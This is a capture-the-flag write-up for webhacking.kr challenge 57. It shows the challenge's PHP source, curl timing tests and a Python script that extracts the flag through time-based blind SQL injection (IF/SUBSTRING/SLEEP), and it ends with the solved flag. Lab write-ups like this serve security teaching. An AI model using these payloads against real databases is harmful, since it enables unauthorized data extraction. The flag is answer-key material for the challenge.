# Old 57    Conditional Time Delays

URL: [https://webhacking.kr/challenge/web-34/](https://webhacking.kr/challenge/web-34/)
Source: [https://webhacking.kr/challenge/web-34/?view_source=1](https://webhacking.kr/challenge/web-34/?view_source=1)

```php
<?php
$db = dbconnect();
if ($_GET["msg"] && isset($_GET["se"])) {
    $_GET["msg"] = addslashes($_GET["msg"]);
    $_GET["se"] = addslashes($_GET["se"]);
    if (preg_match("/select|and|or|not|&|\||benchmark/i", $_GET["se"])) {
        exit("Access Denied");
    }
    mysqli_query(
        $db,
        "insert into chall57(id,msg,pw,op) values('{$_SESSION["id"]}','{$_GET["msg"]}','{$flag}',{$_GET["se"]})"
    );
    echo "Done<br><br>";
    if (rand(0, 100) == 1) {
        mysqli_query($db, "delete from chall57");
    }
}
?>
```

![old-57.png](/assets/ctf/webhacking.kr/old-57.png)

`se` value has many filters including `addslashes`, but since it doesn't have quotes in the query SQLi is still possible. Our tasks is to read the 3rd column, flag.

The code only contains `INSERT` query and no visible output, but we can create the indicator of success and failure using Timed Queries.

[portswigger > SQL injection cheat sheet > Conditional time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet)

```powershell
➜ curl -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' "https://webhacking.kr/challenge/web-34/?msg=x&se=IF(1=1,SLEEP(5),1)" -s -w '%{time_total}s\n' -o NUL
6.345503s
➜ curl -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' "https://webhacking.kr/challenge/web-34/?msg=x&se=IF(1=2,SLEEP(5),1)" -s -w '%{time_total}s\n' -o NUL
1.304001s
```

As we can see the attack is successfully delayed and bypassing filter was a breeze.

Brute force, sadly with non async code so this will take some time... 💀

```python
import string
import requests

URL = 'https://webhacking.kr/challenge/web-34/'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}
CHARSET = string.ascii_letters + string.digits + '{}!?,/_.'
DELAY = 3
PAYLOAD = 'IF(SUBSTRING(pw,{},1)={},SLEEP({}),1)'

flag = 'flag{y2u.be/kmpgjr0el64}'
with requests.Session() as session:
    session.cookies.update(COOKIES)
    while True:
        for char in CHARSET:
            flag_i = len(flag) + 1
            params = {'msg': 'uwu', 'se': PAYLOAD.format(flag_i, hex(ord(char)), DELAY)}
            resp_time = session.get(URL, params=params).elapsed.total_seconds()
            print(f'\r[{flag_i}] {flag} | {char} | {resp_time}', end='')
            if resp_time >= DELAY:
                flag += char
                break
        else:
            break
    
    print(f'\r[{flag_i}] {flag} | {char} | {resp_time}')
# [25] flag{y2u.be/kmpgjr0el64} | . | 0.319743
```



